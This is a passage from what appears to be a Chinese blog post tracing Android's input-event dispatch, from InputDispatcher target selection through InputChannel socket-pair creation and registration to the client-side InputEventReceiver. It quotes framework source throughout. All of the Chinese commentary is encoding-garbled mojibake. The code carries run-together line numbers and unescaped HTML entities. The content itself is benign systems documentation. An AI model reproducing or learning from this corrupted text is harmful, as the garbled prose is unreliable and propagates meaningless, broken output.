mTempTouchState.addOrUpdateWindow(windowHandle, outsideTargetFlags, BitSet32(0)); &#125; &#125;&#125; è¿™æ®µä»£ç çš„ç›®çš„æ˜¯ä¸ºäº†éåŽ†æ‰€æœ‰çš„windowæ‰¾åˆ°è§¦æ‘¸å¯¹åº”çš„é‚£ä¸ªwindowã€‚ 12345678910// Handle the case where we did not find a window.if (newTouchedWindowHandle == NULL) &#123; // Try to assign the pointer to the first foreground window we find, if there is one. newTouchedWindowHandle = mTempTouchState.getFirstForegroundWindowHandle(); if (newTouchedWindowHandle == NULL) &#123; ALOGI("Dropping event because there is no touchable window at (%d, %d).", x, y); injectionResult = INPUT_EVENT_INJECTION_FAILED; goto Failed; &#125;&#125; å¦‚æžœéåŽ†åŽæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„windowï¼Œé‚£å°±å–ç¬¬ä¸€ä¸ªå‰å°çš„windowã€‚ ç„¶åŽé€šè¿‡addWindowTargetLocked()æ–¹æ³•æŠŠç¼“å­˜ä¸‹æ¥çš„ç»“æžœå­˜æ”¾å…¥inputTargetsä¸­ã€‚ 12345for (size_t i = 0; i &lt; mTempTouchState.windows.size(); i++) &#123; const TouchedWindow&amp; touchedWindow = mTempTouchState.windows.itemAt(i); addWindowTargetLocked(touchedWindow.windowHandle, touchedWindow.targetFlags, touchedWindow.pointerIds, inputTargets);&#125; 12345678910111213void InputDispatcher::addWindowTargetLocked(const sp&lt;InputWindowHandle&gt;&amp; windowHandle, int32_t targetFlags, BitSet32 pointerIds, Vector&lt;InputTarget&gt;&amp; inputTargets) &#123; inputTargets.push(); const InputWindowInfo* windowInfo = windowHandle-&gt;getInfo(); InputTarget&amp; target = inputTargets.editTop(); target.inputChannel = windowInfo-&gt;inputChannel; target.flags = targetFlags; target.xOffset = - windowInfo-&gt;frameLeft; target.yOffset = - windowInfo-&gt;frameTop; target.scaleFactor = windowInfo-&gt;scaleFactor; target.pointerIds = pointerIds;&#125; å‡½æ•°å°†åŽŸå§‹çš„windowæ•°æ®è¿›è¡Œäº†å†æ¬¡å°è£…ã€‚ æ‰¾åˆ°åˆé€‚çš„windowæˆ–æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼ˆå¤„ç†é”™è¯¯ï¼‰ä¹‹åŽï¼Œå‡½æ•°è¿”å›žåˆ°bool InputDispatcher::dispatchMotionLocked()ä¸­ï¼š 1dispatchEventLocked(currentTime, entry, inputTargets); å¼€å§‹å‘inputTargetsä¸­çš„ç›®æ ‡åˆ†å‘äº‹ä»¶ï¼š 123456789101112131415void InputDispatcher::dispatchEventLocked(nsecs_t currentTime, EventEntry* eventEntry, const Vector&lt;InputTarget&gt;&amp; inputTargets) &#123;... for (size_t i = 0; i &lt; inputTargets.size(); i++) &#123; const InputTarget&amp; inputTarget = inputTargets.itemAt(i); // éåŽ†ç›®æ ‡ ssize_t connectionIndex = getConnectionIndexLocked(inputTarget.inputChannel); // è§ä¸‹æ–‡ if (connectionIndex &gt;= 0) &#123; sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex); prepareDispatchCycleLocked(currentTime, connection, eventEntry, &amp;inputTarget); &#125; else &#123;... &#125; &#125;&#125; inputTargetä¸­åŒ…å«çš„inputChannelå°±æ˜¯åŽé¢ç”¨äºŽä¸Žwindowå®žä¾‹é€šä¿¡çš„å…³é”®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/* * An input channel consists of a local unix domain socket used to send and receive * input messages across processes. Each channel has a descriptive name for debugging purposes. * * Each endpoint has its own InputChannel object that specifies its file descriptor. * * The input channel is closed when all references to it are released. */class InputChannel : public RefBase &#123; protected: virtual ~InputChannel();public: InputChannel(const String8&amp; name, int fd); /* Creates a pair of input channels. * * Returns OK on success. */ static status_t openInputChannelPair(const String8&amp; name, sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel); inline String8 getName() const &#123; return mName; &#125; inline int getFd() const &#123; return mFd; &#125; /* Sends a message to the other endpoint. * * If the channel is full then the message is guaranteed not to have been sent at all. * Try again after the consumer has sent a finished signal indicating that it has * consumed some of the pending messages from the channel. * * Returns OK on success. * Returns WOULD_BLOCK if the channel is full. * Returns DEAD_OBJECT if the channel's peer has been closed. * Other errors probably indicate that the channel is broken. */ status_t sendMessage(const InputMessage* msg); /* Receives a message sent by the other endpoint. * * If there is no message present, try again after poll() indicates that the fd * is readable. * * Returns OK on success. * Returns WOULD_BLOCK if there is no message present. * Returns DEAD_OBJECT if the channel's peer has been closed. * Other errors probably indicate that the channel is broken. */ status_t receiveMessage(InputMessage* msg); /* Returns a new object that has a duplicate of this channel's fd. */ sp&lt;InputChannel&gt; dup() const;private: String8 mName; int mFd;&#125;; InputChannelåŒ…å«äº†ä¸€ä¸ªæœ¬åœ°unix socketç”¨äºŽè·¨è¿›ç¨‹å‘é€ä¸ŽæŽ¥æ”¶è¾“å…¥ä¿¡æ¯ã€‚ å®ƒçš„æŽ¥å£ååˆ†ç®€å•ï¼Œæˆ‘ä»¬å°±é€šè¿‡sendMessage()ä¸ŽreceiveMessage()ä¸¤ä¸ªå‡½æ•°å®žçŽ°è·¨è¿›ç¨‹é€šä¿¡ã€‚ å›žåˆ°ä¹‹å‰ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªinputChannelçš„Fdï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰æ¥èŽ·å–ä¸€ä¸ªConnectionçš„ç´¢å¼•ï¼Œç„¶åŽæ ¹æ®è¿™ä¸ªç´¢å¼•ä»ŽmConnectionsByFdä¸­èŽ·å–connectionå¯¹è±¡ã€‚ 12345678910ssize_t InputDispatcher::getConnectionIndexLocked(const sp&lt;InputChannel&gt;&amp; inputChannel) &#123; ssize_t connectionIndex = mConnectionsByFd.indexOfKey(inputChannel-&gt;getFd()); if (connectionIndex &gt;= 0) &#123; sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex); if (connection-&gt;inputChannel.get() == inputChannel.get()) &#123; return connectionIndex; &#125; &#125; return -1;&#125; è¿™ä¸ªmConnectionByFdåˆæ˜¯æ€Žä¹ˆå»ºç«‹èµ·æ¥çš„å‘¢ï¼Ÿåœ¨InputDispatcherä¸­åŒ…å«äº†ä¸€ä¸ªregisterInputChannelå‡½æ•°ï¼š 1234567891011121314151617181920212223status_t InputDispatcher::registerInputChannel(const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123;... &#123; // acquire lock AutoMutex _l(mLock);... sp&lt;Connection&gt; connection = new Connection(inputChannel, inputWindowHandle, monitor); int fd = inputChannel-&gt;getFd(); mConnectionsByFd.add(fd, connection); if (monitor) &#123; mMonitoringChannels.push(inputChannel); &#125; mLooper-&gt;addFd(fd, 0, ALOOPER_EVENT_INPUT, handleReceiveCallback, this); &#125; // release lock // Wake the looper because some connections have changed. mLooper-&gt;wake(); return OK;&#125; connectionå¯¹è±¡å°±æ˜¯åœ¨è¿™é‡Œç”±inputChannelæž„é€ å¹¶åŠ å…¥åˆ°mConnectionsByFdä¸­çš„ã€‚è€ŒmConnectionsByFdæœ¬èº«æ˜¯ä¸€ä¸ªä»¥Fdä¸ºç´¢å¼•çš„é”®å€¼å¯¹ï¼š 1KeyedVector&lt;int, sp&lt;Connection&gt; &gt; mConnectionsByFd; å–å¾—connectionå¯¹è±¡ä¹‹åŽï¼Œè¿›å…¥åˆ°äº†prepareDispatchCycleLocked()å‡½æ•°ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å¯¹è¿žæŽ¥çš„çŠ¶æ€æ˜¯å¦æ­£å¸¸è¿›è¡Œæ£€æµ‹ï¼Œè¿žæŽ¥æ­£å¸¸ä¼šè°ƒç”¨enqueueDispatchEntriesLocked()å‡½æ•°ï¼š 1234567891011121314151617181920212223void InputDispatcher::enqueueDispatchEntriesLocked(nsecs_t currentTime, const sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, const InputTarget* inputTarget) &#123; bool wasEmpty = connection-&gt;outboundQueue.isEmpty(); // Enqueue dispatch entries for the requested modes. enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_HOVER_EXIT); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_OUTSIDE); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_HOVER_ENTER); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_IS); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_SLIPPERY_EXIT); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_SLIPPERY_ENTER); // If the outbound queue was previously empty, start the dispatch cycle going. if (wasEmpty &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123; startDispatchCycleLocked(currentTime, connection); &#125;&#125; ä¸­é—´è°ƒç”¨äº†ä¸€ç³»åˆ—çš„enqueueDispatchEntryLocked()å‡½æ•°ï¼š 1234567891011121314151617181920void InputDispatcher::enqueueDispatchEntryLocked( const sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, const InputTarget* inputTarget, int32_t dispatchMode) &#123; int32_t inputTargetFlags = inputTarget-&gt;flags; if (!(inputTargetFlags &amp; dispatchMode)) &#123; return; &#125; inputTargetFlags = (inputTargetFlags &amp; ~InputTarget::FLAG_DISPATCH_MASK) | dispatchMode; // This is a new event. // Enqueue a new dispatch entry onto the outbound queue for this connection. DispatchEntry* dispatchEntry = new DispatchEntry(eventEntry, // increments ref inputTargetFlags, inputTarget-&gt;xOffset, inputTarget-&gt;yOffset, inputTarget-&gt;scaleFactor);... // Enqueue the dispatch entry. connection-&gt;outboundQueue.enqueueAtTail(dispatchEntry); traceOutboundQueueLengthLocked(connection);...&#125; çœç•¥çš„ä»£ç å¯¹entryè¿›è¡Œäº†è¿›ä¸€æ­¥çš„åŒ…è£…ï¼Œç„¶åŽåœ¨æœ€åŽåŠ å…¥åˆ°äº†connectionç»´æŠ¤çš„outboundQueueä¸­ã€‚ å›žåˆ°ä¸Šé¢ï¼Œä¹‹åŽè°ƒç”¨startDispatchCycleLocked()æ­£å¼å¼€å§‹åˆ†å‘äº‹ä»¶ï¼š 123456789while (connection-&gt;status == Connection::STATUS_NORMAL &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123; DispatchEntry* dispatchEntry = connection-&gt;outboundQueue.head; dispatchEntry-&gt;deliveryTime = currentTime; // Publish the event. status_t status; EventEntry* eventEntry = dispatchEntry-&gt;eventEntry; switch (eventEntry-&gt;type) &#123; ä»Žconnectionçš„outboundQueueå–å‡ºentryä¹‹åŽï¼Œæ ¹æ®äº‹ä»¶ç±»åž‹çš„ä¸åŒå¯¹äº‹ä»¶è¿›ä¸€æ­¥å¤„ç†ï¼š 123456789101112131415161718192021222324252627282930313233case EventEntry::TYPE_MOTION: &#123; MotionEntry* motionEntry = static_cast&lt;MotionEntry*&gt;(eventEntry); PointerCoords scaledCoords[MAX_POINTERS]; const PointerCoords* usingCoords = motionEntry-&gt;pointerCoords; // Set the X and Y offset depending on the input source. float xOffset, yOffset, scaleFactor; if ((motionEntry-&gt;source &amp; AINPUT_SOURCE_CLASS_POINTER) &amp;&amp; !(dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS)) &#123; scaleFactor = dispatchEntry-&gt;scaleFactor; xOffset = dispatchEntry-&gt;xOffset * scaleFactor; yOffset = dispatchEntry-&gt;yOffset * scaleFactor; if (scaleFactor != 1.0f) &#123; for (uint32_t i = 0; i &lt; motionEntry-&gt;pointerCount; i++) &#123; scaledCoords[i] = motionEntry-&gt;pointerCoords[i]; scaledCoords[i].scale(scaleFactor); &#125; usingCoords = scaledCoords; &#125; &#125; else &#123; xOffset = 0.0f; yOffset = 0.0f; scaleFactor = 1.0f; // We don't want the dispatch target to know. if (dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS) &#123; for (uint32_t i = 0; i &lt; motionEntry-&gt;pointerCount; i++) &#123; scaledCoords[i].clear(); &#125; usingCoords = scaledCoords; &#125; &#125; åœ¨å¯¹äº‹ä»¶çš„åæ ‡è¿›è¡Œè§£æžï¼ˆç¼©æ”¾ï¼‰ä¹‹åŽï¼Œè¿›å…¥ä¸‹é¢çš„å‘å¸ƒè¿‡ç¨‹ï¼š 123456789101112 // Publish the motion event. status = connection-&gt;inputPublisher.publishMotionEvent(dispatchEntry-&gt;seq, motionEntry-&gt;deviceId, motionEntry-&gt;source, dispatchEntry-&gt;resolvedAction, motionEntry-&gt;actionButton, dispatchEntry-&gt;resolvedFlags, motionEntry-&gt;edgeFlags, motionEntry-&gt;metaState, motionEntry-&gt;buttonState, xOffset, yOffset, motionEntry-&gt;xPrecision, motionEntry-&gt;yPrecision, motionEntry-&gt;downTime, motionEntry-&gt;eventTime, motionEntry-&gt;pointerCount, motionEntry-&gt;pointerProperties, usingCoords); break;&#125; å®žé™…ä¸Šè°ƒç”¨äº†InputPublisherçš„publishMotionEvent()å‡½æ•°ï¼š 1234567891011121314151617181920212223InputMessage msg;msg.header.type = InputMessage::TYPE_MOTION;msg.body.motion.seq = seq;msg.body.motion.deviceId = deviceId;msg.body.motion.source = source;msg.body.motion.action = action;msg.body.motion.actionButton = actionButton;msg.body.motion.flags = flags;msg.body.motion.edgeFlags = edgeFlags;msg.body.motion.metaState = metaState;msg.body.motion.buttonState = buttonState;msg.body.motion.xOffset = xOffset;msg.body.motion.yOffset = yOffset;msg.body.motion.xPrecision = xPrecision;msg.body.motion.yPrecision = yPrecision;msg.body.motion.downTime = downTime;msg.body.motion.eventTime = eventTime;msg.body.motion.pointerCount = pointerCount;for (uint32_t i = 0; i &lt; pointerCount; i++) &#123; msg.body.motion.pointers[i].properties.copyFrom(pointerProperties[i]); msg.body.motion.pointers[i].coords.copyFrom(pointerCoords[i]);&#125;return mChannel-&gt;sendMessage(&amp;msg); å‡½æ•°é‡Œå°è£…äº†ä¸€ä¸ªmsgï¼Œç„¶åŽæœ€ç»ˆè°ƒç”¨äº†mChannelçš„sendMessage()æ–¹æ³•è¿›è¡Œè·¨è¿›ç¨‹é€šä¿¡ã€‚ çŽ°åœ¨æˆ‘ä»¬åˆ°äº†å›¾ä¸­çš„è¿™ä¸€æ­¥ï¼š æˆ‘ä»¬çš„ç‚¹å‡»äº‹ä»¶æ¥åˆ°äº†å»ºç«‹çš„socketä¸­ï¼Œå‡†å¤‡ä¸Žäº¤ä»˜ç»™å¯¹åº”çš„appï¼Œæˆ‘ä»¬çŸ¥é“æ¯ä¸ªappè¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹ä¸­ï¼Œæ‰€ä»¥å°±éœ€è¦ä½¿ç”¨socketæ¥è¿›è¡Œè·¨è¿›ç¨‹é€šä¿¡ã€‚ InputChannelè¿žæŽ¥å»ºç«‹è¿‡ç¨‹æœ¬æ®µå†…å®¹ä¸»è¦å‚è€ƒäº† Gityuançš„åšå®¢ è¯¦ç»†åˆ†æžåŠä»£ç è¯·ç§»æ­¥ä¸Šé¢é“¾æŽ¥ã€‚ è¿žæŽ¥çš„å»ºç«‹æ˜¯åœ¨ä¸€ä¸ªActivityå¯åŠ¨æ—¶è¿›è¡Œçš„ã€‚ Activityçš„å¯åŠ¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„è¿‡ç¨‹ï¼Œä¼šç»è¿‡ActivityManagerServiceä¸ŽWindowManagerServiceçš„å±‚å±‚è°ƒç”¨ï¼Œæœ€ç»ˆåˆ°è¾¾WindowManagerGlobalçš„addView()æ–¹æ³•ã€‚ 12345678910111213public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) &#123; ... ViewRootImpl root; View panelParentView = null; ... root = new ViewRootImpl(view.getContext(), display); ... root.setView(view, wparams, panelParentView); ...&#125; åœ¨addViewä¸­ï¼Œåˆ›å»ºå¹¶åˆå§‹åŒ–äº†ä¸€ä¸ªViewRootImplå¯¹è±¡ï¼Œå¹¶è°ƒç”¨äº†å®ƒçš„setView()æ–¹æ³•ã€‚ ViewRootImplçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼š 12345public ViewRootImpl(Context context, Display display) &#123; ... mWindowSession = WindowManagerGlobal.getWindowSession(); ...&#125; è¿™é‡Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯è¿™ä¸ªmWindowSessionå¯¹è±¡çš„åˆå§‹åŒ–ã€‚ 12345678910111213141516171819202122public static IWindowSession getWindowSession() &#123; synchronized (WindowManagerGlobal.class) &#123; if (sWindowSession == null) &#123; try &#123; InputMethodManager imm = InputMethodManager.getInstance(); IWindowManager windowManager = getWindowManagerService(); // èŽ·å–Sessionå¯¹è±¡ï¼Œåˆ©ç”¨Binderæœºåˆ¶è°ƒç”¨ç³»ç»Ÿçº¿ç¨‹çš„æ–¹æ³• sWindowSession = windowManager.openSession( new IWindowSessionCallback.Stub() &#123; @Override public void onAnimatorScaleChanged(float scale) &#123; ValueAnimator.setDurationScale(scale); &#125; &#125;, imm.getClient(), imm.getInputContext()); &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125; &#125; return sWindowSession; &#125;&#125; ä¸‹é¢æ˜¯setView()ï¼š 1234567891011121314public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) &#123; ... // æœåŠ¡ç«¯è¿‡ç¨‹ res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mInputChannel); ... // å®¢æˆ·ç«¯è¿‡ç¨‹ if (mInputChannel != null) &#123; mInputEventReceiver = new WindowInputEventReceiver(mInputChannel, Looper.myLooper()); &#125; ...&#125; ä¸Šé¢çš„ä¸¤è¡Œè¯­å¥åˆ†åˆ«çš„å¯¹åº”ä¸¤ä¸ªæ³¨å†Œè¿‡ç¨‹çš„å¼€å§‹ï¼Œå…ˆæ‰§è¡ŒæœåŠ¡ç«¯çš„æ³¨å†Œä¸Žç›‘å¬ï¼Œå†æ‰§è¡Œå®¢æˆ·ç«¯çš„æ³¨å†Œä¸Žç›‘å¬ã€‚ ä¸‹é¢å¯¹è¿™ä¸¤ä¸ªè¿‡ç¨‹åˆ†åˆ«è¿›è¡Œè¿½è¸ªã€‚ æœåŠ¡ç«¯è¿‡ç¨‹é€šè¿‡åˆšåˆšèŽ·å–çš„mWindowSessionåŽ»è°ƒç”¨ç³»ç»Ÿçº¿ç¨‹ä¸­çš„addToDisplay()æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627 @Override public int addToDisplay(IWindow window, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) &#123; return mService.addWindow(this, window, seq, attrs, viewVisibility, displayId, outContentInsets, outStableInsets, outOutsets, outInputChannel); &#125;...è¿™ä¸ª`mService`è‡ªç„¶å°±æ˜¯ä¹‹å‰èŽ·å–å®ƒä½¿ç”¨çš„`WindowManagerService`ï¼Œè°ƒç”¨å®ƒçš„`addWindow()`æ–¹æ³•ï¼šâ€‹```java public int addWindow(Session session, IWindow client, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) &#123; ... WindowState win = new WindowState(this, session, client, token, attachedWindow, appOp[0], seq, attrs, viewVisibility, displayContent); ... final boolean openInputChannels = (outInputChannel != null &amp;&amp; (attrs.inputFeatures &amp; INPUT_FEATURE_NO_INPUT_CHANNEL) == 0); if (openInputChannels) &#123; win.openInputChannel(outInputChannel); &#125; ... &#125; æˆ‘ä»¬å…³æ³¨çš„æ˜¯å®ƒåˆ›å»ºå¹¶åˆå§‹åŒ–äº†WindowStateå¯¹è±¡ï¼Œç„¶åŽè°ƒç”¨äº†å®ƒçš„openInputChannel()æ–¹æ³•ï¼š 123456789101112131415161718192021void openInputChannel(InputChannel outInputChannel) &#123; if (mInputChannel != null) &#123; throw new IllegalStateException("Window already has an input channel."); &#125; String name = makeInputChannelName(); InputChannel[] inputChannels = InputChannel.openInputChannelPair(name); mInputChannel = inputChannels[0]; // è¿™é‡Œå°†æœåŠ¡ç«¯çš„inputChannelä¿å­˜åœ¨äº†WindowStateä¸­ mClientChannel = inputChannels[1]; mInputWindowHandle.inputChannel = inputChannels[0]; if (outInputChannel != null) &#123; mClientChannel.transferTo(outInputChannel); mClientChannel.dispose(); mClientChannel = null; &#125; else &#123; // If the window died visible, we setup a dummy input channel, so that taps // can still detected by input monitor channel, and we can relaunch the app. // Create dummy event receiver that simply reports all events as handled. mDeadWindowEventReceiver = new DeadWindowEventReceiver(mClientChannel); &#125; mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);&#125; åœ¨è¿™é‡Œåˆ›å»ºäº†ä¸¤ä¸ªInputChannelå¯¹è±¡ï¼Œå…¶ä¸­ä½œä¸ºæœåŠ¡ç«¯å­˜æ”¾åœ¨ç³»ç»Ÿè¿›ç¨‹ä¸­çš„æ˜¯inputChannels[0]ï¼Œä½œä¸ºå®¢æˆ·ç«¯çš„å­˜æ”¾åœ¨appçš„uiä¸»çº¿ç¨‹ä¸­çš„æ˜¯inputChannels[1]ã€‚å®ƒä»¬çš„ä¼ é€’è¿‡ç¨‹ä¹‹åŽå†çœ‹ï¼Œæˆ‘ä»¬å…ˆçœ‹InputChannelå»ºç«‹æ—¶è°ƒç”¨çš„openInputChannelPair()æ–¹æ³•ï¼š 12345678910public static InputChannel[] openInputChannelPair(String name) &#123; if (name == null) &#123; throw new IllegalArgumentException("name must not be null"); &#125; if (DEBUG) &#123; Slog.d(TAG, "Opening input channel pair '" + name + "'"); &#125; return nativeOpenInputChannelPair(name);&#125; è°ƒç”¨äº†nativeæ–¹æ³•ï¼š 123456789static jobjectArray android_view_InputChannel_nativeOpenInputChannelPair(JNIEnv* env, jclass clazz, jstring nameObj) &#123; ... sp&lt;InputChannel&gt; serverChannel; sp&lt;InputChannel&gt; clientChannel; status_t result = InputChannel::openInputChannelPair(name, serverChannel, clientChannel); ... return channelPair;&#125; åœ¨è¿™é‡Œå°±åˆ†ä¸ºäº†serverChannelä¸ŽclientChannelï¼Œä½œä¸ºopenInputChannelPairè°ƒç”¨çš„ä¸¤å‚æ•°æ¥æˆå¯¹åœ°åˆ›å»ºï¼š 123456789101112131415161718192021222324252627status_t InputChannel::openInputChannelPair(const String8&amp; name, sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel) &#123; int sockets[2]; if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sockets)) &#123; status_t result = -errno; ALOGE("channel '%s' ~ Could not create socket pair. errno=%d", name.string(), errno); outServerChannel.clear(); outClientChannel.clear(); return result; &#125; int bufferSize = SOCKET_BUFFER_SIZE; setsockopt(sockets[0], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[0], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[1], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, sizeof(bufferSize)); String8 serverChannelName = name; serverChannelName.append(" (server)"); outServerChannel = new InputChannel(serverChannelName, sockets[0]); String8 clientChannelName = name; clientChannelName.append(" (client)"); outClientChannel = new InputChannel(clientChannelName, sockets[1]); return OK;&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬4è¡Œä½¿ç”¨äº†ç³»ç»Ÿè°ƒç”¨socketpair()æ¥åˆ›å»ºä¸€å¯¹æœ¬åœ°socketå¯¹è±¡ï¼Œä½¿ç”¨intæ•°ç»„socketsæ¥æŽ¥æ”¶åˆ›å»ºå¥½çš„fdã€‚ ä¸‹é¢ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨setsockopt()æ¥ä¸ºæ–°å»ºçš„socketè¿›è¡Œé…ç½®ï¼Œè®¾ç½®äº†socketå®žä½“çš„è¾“å…¥è¾“å‡ºbuffå¤§å°ã€‚ ç¬¬21ã€25è¡Œè°ƒç”¨äº†Native InputChannelçš„æž„é€ æ–¹æ³•ä»¥name+(server)æˆ–name+(client)ä½œä¸ºåå­—å‚æ•°ä¸Žåˆ›å»ºå¥½çš„socketä½œä¸ºfdå‚æ•°æ¥æž„é€ InputChannelå¯¹è±¡ï¼Œå®ƒçš„æž„é€ æ–¹æ³•ï¼š 1234567891011InputChannel::InputChannel(const String8&amp; name, int fd) : mName(name), mFd(fd) &#123;#if DEBUG_CHANNEL_LIFECYCLE ALOGD("Input channel constructed: name='%s', fd=%d", mName.string(), fd);#endif int result = fcntl(mFd, F_SETFL, O_NONBLOCK); LOG_ALWAYS_FATAL_IF(result != 0, "channel '%s' ~ Could not make socket " "non-blocking. errno=%d", mName.string(), errno);&#125; å°†name fdä¿å­˜åˆ°åŸŸä¸­ï¼Œå¹¶é…ç½®äº†fdã€‚ çŽ°åœ¨æˆ‘ä»¬çš„ä¸¤ä¸ªInputChannelï¼ˆå®žé™…ä¸Šæ˜¯ä¸€å¯¹æœ¬åœ°socketçš„å°è£…ï¼‰å°±åˆ›å»ºå¥½äº†ã€‚ çŽ°åœ¨æˆ‘ä»¬å›žåˆ°WindowStateçš„openInputChannel()æ–¹æ³•ä¸­ï¼Œåœ¨æˆåŠŸåˆ›å»ºä¸¤ä¸ªInputChannelåŽï¼Œè°ƒç”¨äº†mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);ï¼š 12345678public void registerInputChannel(InputChannel inputChannel, InputWindowHandle inputWindowHandle) &#123; if (inputChannel == null) &#123; throw new IllegalArgumentException("inputChannel must not be null."); &#125; nativeRegisterInputChannel(mPtr, inputChannel, inputWindowHandle, false);&#125; 1234567891011121314static void nativeRegisterInputChannel(JNIEnv* env, jclass /* clazz */, jlong ptr, jobject inputChannelObj, jobject inputWindowHandleObj, jboolean monitor) &#123; NativeInputManager* im = reinterpret_cast&lt;NativeInputManager*&gt;(ptr); sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env, inputChannelObj); ... sp&lt;InputWindowHandle&gt; inputWindowHandle = android_server_InputWindowHandle_getHandle(env, inputWindowHandleObj); status_t status = im-&gt;registerInputChannel( env, inputChannel, inputWindowHandle, monitor); ...&#125; 123456status_t NativeInputManager::registerInputChannel(JNIEnv* /* env */, const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123; return mInputManager-&gt;getDispatcher()-&gt;registerInputChannel( inputChannel, inputWindowHandle, monitor);&#125; getDispatcher()è¿”å›žäº†InputDispatcherå¯¹è±¡ï¼Œè¿™ä¸ªæ–¹æ³•å°±è°ƒç”¨äº†æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„InputDispatcher::registerInputchannel()æ–¹æ³•ï¼Œå‘InputDispatcheræ³¨å†Œäº†æˆ‘ä»¬åˆ›å»ºå¥½çš„InputChannelæœåŠ¡ç«¯ã€‚ æˆ‘ä»¬å›žé¡¾ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼š 1234567891011121314151617181920212223status_t InputDispatcher::registerInputChannel(const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123;... &#123; // acquire lock AutoMutex _l(mLock);... sp&lt;Connection&gt; connection = new Connection(inputChannel, inputWindowHandle, monitor); int fd = inputChannel-&gt;getFd(); mConnectionsByFd.add(fd, connection); if (monitor) &#123; mMonitoringChannels.push(inputChannel); &#125; mLooper-&gt;addFd(fd, 0, ALOOPER_EVENT_INPUT, handleReceiveCallback, this); &#125; // release lock // Wake the looper because some connections have changed. mLooper-&gt;wake(); return OK;&#125; å°†InputChannelçš„Fdä½œä¸ºç´¢å¼•ä¿å­˜åˆ°InputDispatcherä¸­ã€‚ ç„¶åŽè°ƒç”¨mLooperçš„addFdåœ¨Native Looperä¸­è®¾ç½®è‡ªå®šä¹‰fdè¿›è¡Œç›‘å¬ï¼Œä¼ å…¥äº†handleReceiveCallback()å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¿™æ ·ä¸€æ¥ï¼Œåœ¨æœåŠ¡ç«¯æ”¶åˆ°æ¶ˆæ¯æ—¶å°±ä¼šè¿›è¡Œå›žè°ƒã€‚å…³äºŽNative Looperå¤„ç†äº‹ä»¶çš„åˆ†æžå¯è§å¦ä¸€ç³»åˆ—çš„åšæ–‡ã€‚ å®¢æˆ·ç«¯è¿‡ç¨‹1234// å®¢æˆ·ç«¯è¿‡ç¨‹if (mInputChannel != null) &#123; mInputEventReceiver = new WindowInputEventReceiver(mInputChannel, Looper.myLooper());&#125; è¿™é‡Œä»¥å®¢æˆ·ç«¯InputChannelä¸Žå½“å‰åº”ç”¨çš„Looperä½œä¸ºå‚æ•°ï¼Œåˆå§‹åŒ–äº†WindowInputEventReceiverå¯¹è±¡ï¼š 123456789public InputEventReceiver(InputChannel inputChannel, Looper looper) &#123; ... mInputChannel = inputChannel; mMessageQueue = looper.getQueue(); mReceiverPtr = nativeInit(new WeakReference&lt;InputEventReceiver&gt;(this), inputChannel, mMessageQueue); mCloseGuard.open("dispose");&#125; 